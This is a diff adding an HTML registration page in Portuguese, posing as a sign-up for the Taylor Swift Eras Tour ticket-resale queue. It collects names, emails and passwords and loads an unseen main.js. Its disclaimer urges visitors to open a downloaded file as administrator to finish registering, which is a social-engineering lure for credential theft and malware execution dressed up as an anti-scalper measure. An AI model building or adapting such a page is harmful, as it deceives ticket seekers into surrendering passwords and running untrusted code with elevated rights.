@@ -1,0 +1,141 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Formulário de Registro</title>
+    <style>
+        body {
+            background-image: url("abc.jpg");
+            background-repeat: no-repeat;
+            background-size: 57.5em;
+            background-color: black;
+            font-family: ISOCP, sans-serif;
+            margin: 0;
+            padding: 0px;
+        }
+
+        h2 {
+            text-align: center;
+            margin-left: 10px;
+            font-size: 35px;
+            color: black;
+        }
+
+        h3 {
+            text-align: center;
+            font-size: 100px;
+            color: rebeccapurple;
+        }
+
+        h4 {
+            text-align: center;
+            margin-left: 0px;
+            font-size: 3em;
+            color: white;
+        }
+
+        .container1 {
+            display: flex;
+            flex-direction: row;
+        }
+
+        .container2 {
+            align-self: center;
+            height: 93vh;
+            width: 50em;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .container3 {
+            width: 25em;
+            margin: 0 auto;
+            background-color: black;
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            margin-left: auto;
+            margin-right: 0;
+            height: 93vh;
+        }
+
+        .form-group {
+            margin-bottom: 20px;
+        }
+
+            .form-group label {
+                display: block;
+                font-weight: bold;
+                margin-bottom: 5px;
+                color: white;
+            }
+
+            .form-group input {
+                width: 100%;
+                padding: 10px;
+                border: 1px solid #ccc;
+                border-radius: 50px;
+                box-sizing: border-box;
+                font-size: 16px;
+            }
+
+            .form-group button {
+                margin-top: 50px;
+                width: 100%;
+                padding: 10px;
+                background-color: #ffffff;
+                border: none;
+                background-color: white;
+                cursor: pointer;
+                font-size: 16px;
+                color: black;
+                border-radius: 50px;
+            }
+
+                .form-group button:hover {
+                    background-color: #00ff21;
+                }
+
+        .disclaimer {
+            font-size: 12px;
+            color: white;
+            text-align: center;
+            margin-top: 20px;
+        }
+
+            .disclaimer a {
+                color: white;
+                text-decoration: underline;
+            }
+    </style>
+</head>
+<body>
+    <div class="container1">
+        <div class="container2">
+            <h3><strong>THE ERAS TOUR</strong></h3>
+        </div>
+        <div class="container3">
+            <h4>Cadastre-se</h4>
+            <form id="submitForm">
+                <div class="form-group">
+                    <input type="text" id="name" name="name" required placeholder="Nome">
+                </div>
+                <div class="form-group">
+                    <input type="email" id="email" name="email" required placeholder="Email">
+                </div>
+                <div class="form-group">
+                    <input type="password" id="password" name="password" required placeholder="Senha">
+                </div>
+                <div class="form-group">
+                    <button type="submit" id="submit">Registrar</button>
+                </div>
+            </form>
+            <p class="disclaimer">
+                O cadastro é necessário para entrar na fila de revenda de ingressos da Tour da Taylor Swift.
+                Para garantir a segurança e evitar a ação de cambistas, é importante que todas as pessoas interessadas façam o cadastro e abra o arquivo baixado como administrador, para concluir o cadastro e receber atualizações no email. 
+            </p>
+        </div>
+    </div>
+    <script src='main.js'></script>
+</body>
+</html>
